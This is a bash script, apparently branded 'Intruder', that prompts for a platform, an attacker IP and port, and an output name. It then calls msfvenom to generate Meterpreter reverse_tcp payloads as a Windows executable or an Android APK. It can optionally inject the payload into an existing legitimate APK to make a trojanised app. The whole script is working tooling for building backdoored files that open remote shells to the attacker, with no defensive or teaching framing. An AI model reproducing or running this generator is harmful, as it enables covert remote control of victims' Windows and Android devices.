#!/bin/bash

# Function to display help
show_help() {
    echo -e "\033[1;32mUsage:\033[0m $0 [options]"
    echo
    echo -e "\033[1;36mOptions:\033[0m"
    echo -e "  \033[1;32m-h, --help\033[0m          Display this help message"
    echo
    echo -e "\033[1;36mExample:\033[0m"
    echo "  Just run the script and follow the prompts."
}

# Function to display ASCII art
display_ascii_art() {
    echo -e "\033[1;34m"
    echo "╦┌┐┌┌┬┐┬─┐┬ ┬┌┬┐┌─┐┬─┐"
    echo "║│││ │ ├┬┘│ │ ││├┤ ├┬┘"
    echo "╩┘└┘ ┴ ┴└─└─┘─┴┘└─┘┴└─"
    echo -e "\033[0m"
}

# Function to display a colorful prompt
read_colored_input() {
    local prompt=$1
    local varname=$2
    echo -ne "\033[1;33m$prompt\033[0m"
    read $varname
}

# Display ASCII art
display_ascii_art

# Interactive input for platform
read_colored_input "Enter the platform (\033[1;32mwindows\033[0m/\033[1;32mandroid\033[0m): " platform

# Validate platform input
if [[ "$platform" != "windows" && "$platform" != "android" ]]; then
    echo -e "\033[1;31mError:\033[0m Invalid platform specified. Choose 'windows' or 'android'."
    exit 1
fi

# Interactive input for LHOST
read_colored_input "Enter LHOST (\033[1;32mIP address\033[0m): " lhost

# Interactive input for LPORT
read_colored_input "Enter LPORT (\033[1;32mPort number\033[0m): " lport

# Interactive input for output file
read_colored_input "Enter the output file name (e.g., \033[1;32mpayload.exe\033[0m or \033[1;32mpayload.apk\033[0m): " output

# Check if Android platform was selected
if [[ "$platform" == "android" ]]; then
    read_colored_input "Do you want to embed the payload into an existing APK? (\033[1;32my\033[0m/\033[1;32mn\033[0m): " embed_apk

    if [[ "$embed_apk" == "y" ]]; then
        read_colored_input "Enter the path to the existing APK file: " apk_path

        if [[ ! -f "$apk_path" ]]; then
            echo -e "\033[1;31mError:\033[0m The specified path is incorrect or the file does not exist."
            exit 1
        fi

        msfvenom -x "$apk_path" -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$output"
        echo -e "\033[1;32mPayload embedded into existing APK and saved as \033[1;34m$output\033[0m"
    elif [[ "$embed_apk" == "n" ]]; then
        msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" R > "$output"
        echo -e "\033[1;32mAndroid payload generated and saved as \033[1;34m$output\033[0m"
    else
        echo -e "\033[1;31mError:\033[0m Invalid option specified. Choose 'y' or 'n'."
        exit 1
    fi
elif [[ "$platform" == "windows" ]]; then
    msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output"
    echo -e "\033[1;32mWindows payload generated and saved as \033[1;34m$output\033[0m"
else
    echo -e "\033[1;31mError:\033[0m Invalid platform specified. Choose 'windows' or 'android'."
    show_help
    exit 1
fi
